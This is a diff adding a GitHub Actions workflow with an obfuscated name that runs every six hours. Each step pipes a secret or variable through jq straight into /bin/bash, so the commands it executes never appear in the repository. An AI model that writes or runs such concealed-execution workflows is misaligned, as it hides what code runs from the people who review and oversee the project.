@@ -1,0 +1,22 @@
+name: pengjirenxiaominghai
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '12 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: pengjirenxiaominghai
+        env:
+          res89: ${{ secrets.res89 }}
+        run: |
+          echo $res89 | jq -r .odym6572 | /bin/bash
+          echo $e5 | jq -r .ro7 | /bin/bash
+          echo $ybcoz7504 | jq -r .oqg1020 | /bin/bash
+          echo $iufss9 | jq -r .kec13 | /bin/bash
+
